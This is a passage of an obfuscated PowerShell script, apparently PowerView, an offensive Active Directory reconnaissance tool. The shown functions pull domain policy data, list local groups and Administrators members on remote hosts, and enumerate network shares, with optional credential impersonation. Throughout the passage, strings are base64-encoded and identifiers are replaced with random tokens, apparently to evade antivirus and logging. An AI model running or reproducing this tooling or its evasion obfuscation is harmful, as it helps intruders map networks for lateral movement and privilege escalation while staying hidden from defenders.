                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${51bfe0eb07c040518024bb4ab78efb12}.GPOPath
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${51bfe0eb07c040518024bb4ab78efb12}.GPOType
                        ${9b35e64cb9294860a592006f83851e0b}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        ${9b35e64cb9294860a592006f83851e0b}
                    }
                }
            }
        }
    }
}
function Get-DomainPolicyData {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${361a580794ef4c89844cfea6747040fa} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif (($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 'DC')) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        ${f3563973434141f8a95e056127785171} = b86c55f8931f4479ba4635fb6773bb3f @afd7d337a750465cb1eadfa1f8ae176d
        ForEach (${49c8423a1c59432baa79afb15cafad6f} in ${f3563973434141f8a95e056127785171}) {
            ${48783784f9ff4bc7b5ae02cf51f877ca} = ${49c8423a1c59432baa79afb15cafad6f}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${0992b5578ab849719e32d086ada1e57d} =  @{
                'GptTmplPath' = ${48783784f9ff4bc7b5ae02cf51f877ca}
                'OutputObject' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${0992b5578ab849719e32d086ada1e57d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            a172e43005cd4658bcc5801312e35ab1 @0992b5578ab849719e32d086ada1e57d | ForEach-Object {
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) ${49c8423a1c59432baa79afb15cafad6f}.name
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${49c8423a1c59432baa79afb15cafad6f}.displayname
                $_
            }
        }
    }
}
function Get-NetLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${Env:ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${13c189985c404b12a2d30fe9978381d3} = 1
                ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
                ${75506c77e2124e73b6b331abc518e3c5} = 0
                ${854afacc1bad4f30986f9660b9806381} = 0
                ${b002dc9ebaf545c591a08e495fbdae7c} = 0
                ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::NetLocalGroupEnum(${a9e149a622e146cb8c4c690f286bb4b0}, ${13c189985c404b12a2d30fe9978381d3}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, -1, [ref]${75506c77e2124e73b6b331abc518e3c5}, [ref]${854afacc1bad4f30986f9660b9806381}, [ref]${b002dc9ebaf545c591a08e495fbdae7c})
                ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
                if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                    ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${fa661204ee124231b77f6d8248eb4057}::GetSize()
                    for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${75506c77e2124e73b6b331abc518e3c5}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                        ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                        ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${fa661204ee124231b77f6d8248eb4057}
                        ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                        ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${bb98c29e808a43c19f4dca0be9ac26b2}.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA'))))
                        $LocalGroup
                    }
                    $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
                }
            }
            else {
                ${9e9034bbba2b4e74baa2f8d39f4e2d83} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQAsAGMAbwBtAHAAdQB0AGUAcgA=')))
                ${9e9034bbba2b4e74baa2f8d39f4e2d83}.psbase.children | Where-Object { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    ${d9df5fc678774e82bffed7271d02d4ca} = New-Object PSObject
                    ${d9df5fc678774e82bffed7271d02d4ca} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                    ${d9df5fc678774e82bffed7271d02d4ca} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))))
                    ${d9df5fc678774e82bffed7271d02d4ca} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    ${d9df5fc678774e82bffed7271d02d4ca} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
                    ${d9df5fc678774e82bffed7271d02d4ca}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATgBUAA=='))))
                    ${d9df5fc678774e82bffed7271d02d4ca}
                }
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function e150f28bcce5485f91fe17db27bed54c {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${Env:ac645935110b4eaea96e7bf6f0b2d7f4},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${14eb3c56654d4851b0c0e59e10d33e62} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${13c189985c404b12a2d30fe9978381d3} = 2
                ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
                ${75506c77e2124e73b6b331abc518e3c5} = 0
                ${854afacc1bad4f30986f9660b9806381} = 0
                ${b002dc9ebaf545c591a08e495fbdae7c} = 0
                ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::NetLocalGroupGetMembers(${a9e149a622e146cb8c4c690f286bb4b0}, ${14eb3c56654d4851b0c0e59e10d33e62}, ${13c189985c404b12a2d30fe9978381d3}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, -1, [ref]${75506c77e2124e73b6b331abc518e3c5}, [ref]${854afacc1bad4f30986f9660b9806381}, [ref]${b002dc9ebaf545c591a08e495fbdae7c})
                ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
                ${805886bfe59f43f7b547a914109edc67} = @()
                if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                    ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${e7301a72b6ae437d881d24511203f788}::GetSize()
                    for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${75506c77e2124e73b6b331abc518e3c5}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                        ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                        ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${e7301a72b6ae437d881d24511203f788}
                        ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                        ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                        ${8c11d140990b4ddf9ada00c5a4ed6f0a} = ''
                        ${e51dcfba659540448adbd37cfbc56ed8} = ${010428763869431e80e18c1b0127d8f7}::ConvertSidToStringSid(${bb98c29e808a43c19f4dca0be9ac26b2}.lgrmi2_sid, [ref]${8c11d140990b4ddf9ada00c5a4ed6f0a});${a4b4c23e0ef94f2bab076518375de072} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${e51dcfba659540448adbd37cfbc56ed8} -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
                        }
                        else {
                            ${20ebd067c548454fa60a45c352c7aeb5} = New-Object PSObject
                            ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                            ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
                            ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.lgrmi2_domainandname
                            ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${8c11d140990b4ddf9ada00c5a4ed6f0a}
                            ${b464a468ca1849449cb85f2df6b95829} = $(${bb98c29e808a43c19f4dca0be9ac26b2}.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${b464a468ca1849449cb85f2df6b95829}
                            ${20ebd067c548454fa60a45c352c7aeb5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByAC4AQQBQAEkA'))))
                            ${805886bfe59f43f7b547a914109edc67} += ${20ebd067c548454fa60a45c352c7aeb5}
                        }
                    }
                    $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
                    ${3b87a6f9c6874fba97ce945ec562080a} = ${805886bfe59f43f7b547a914109edc67} | Where-Object {$_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | Select-Object -Expand SID
                    if (${3b87a6f9c6874fba97ce945ec562080a}) {
                        ${3b87a6f9c6874fba97ce945ec562080a} = ${3b87a6f9c6874fba97ce945ec562080a}.Substring(0, ${3b87a6f9c6874fba97ce945ec562080a}.LastIndexOf('-'))
                        ${805886bfe59f43f7b547a914109edc67} | ForEach-Object {
                            if ($_.SID -match ${3b87a6f9c6874fba97ce945ec562080a}) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                            }
                        }
                    }
                    else {
                        ${805886bfe59f43f7b547a914109edc67} | ForEach-Object {
                            if ($_.SID -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                            }
                        }
                    }
                    ${805886bfe59f43f7b547a914109edc67}
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
                }
            }
            else {
                try {
                    ${0b736418a361474c9c0715357f53e6e7} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQAvACQAewAxADQAZQBiADMAYwA1ADYANgA1ADQAZAA0ADgANQAxAGIAMABjADAAZQA1ADkAZQAxADAAZAAzADMAZQA2ADIAfQAsAGcAcgBvAHUAcAA=')))
                    ${0b736418a361474c9c0715357f53e6e7}.psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))) | ForEach-Object {
                        ${20ebd067c548454fa60a45c352c7aeb5} = New-Object PSObject
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
                        ${04c9627bbe564bc3bf5086403b6dba4f} = ([ADSI]$_)
                        ${0e7b6f99306e4ebcb7ad3c3190a35fec} = ${04c9627bbe564bc3bf5086403b6dba4f}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAUABhAHQAaAA=')))).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        ${b464a468ca1849449cb85f2df6b95829} = (${04c9627bbe564bc3bf5086403b6dba4f}.SchemaClassName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches(${0e7b6f99306e4ebcb7ad3c3190a35fec}, '/')).count -eq 1) {
                            ${c2b962210c214714bd58110399570232} = $True
                            $Name = ${0e7b6f99306e4ebcb7ad3c3190a35fec}.Replace('/', '\')
                        }
                        else {
                            ${c2b962210c214714bd58110399570232} = $False
                            $Name = ${0e7b6f99306e4ebcb7ad3c3190a35fec}.Substring(${0e7b6f99306e4ebcb7ad3c3190a35fec}.IndexOf('/')+1).Replace('/', '\')
                        }
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier(${04c9627bbe564bc3bf5086403b6dba4f}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${b464a468ca1849449cb85f2df6b95829}
                        ${20ebd067c548454fa60a45c352c7aeb5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${c2b962210c214714bd58110399570232}
                        ${20ebd067c548454fa60a45c352c7aeb5}
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAXQAgAEUAcgByAG8AcgAgAGYAbwByACAAJAB7AGEAOQBlADEANAA5AGEANgAyADIAZQAxADQANgBjAGIAOABjADQAYwA2ADkAMABmADIAOAA2AGIAYgA0AGIAMAB9ACAAOgAgACQAXwA=')))
                }
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function bc2b811be1804f37b3e4bed481ef34b0 {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${13c189985c404b12a2d30fe9978381d3} = 1
            ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
            ${75506c77e2124e73b6b331abc518e3c5} = 0
            ${854afacc1bad4f30986f9660b9806381} = 0
            ${b002dc9ebaf545c591a08e495fbdae7c} = 0
            ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::NetShareEnum(${a9e149a622e146cb8c4c690f286bb4b0}, ${13c189985c404b12a2d30fe9978381d3}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, -1, [ref]${75506c77e2124e73b6b331abc518e3c5}, [ref]${854afacc1bad4f30986f9660b9806381}, [ref]${b002dc9ebaf545c591a08e495fbdae7c})
            ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
            if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${544cb2fd3aa84a4db9e5c5d3dc63db8f}::GetSize()
                for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${75506c77e2124e73b6b331abc518e3c5}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                    ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                    ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${544cb2fd3aa84a4db9e5c5d3dc63db8f}
                    ${2b17e1b109e5462d9830997612cc8a23} = ${bb98c29e808a43c19f4dca0be9ac26b2} | Select-Object *
                    ${2b17e1b109e5462d9830997612cc8a23} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
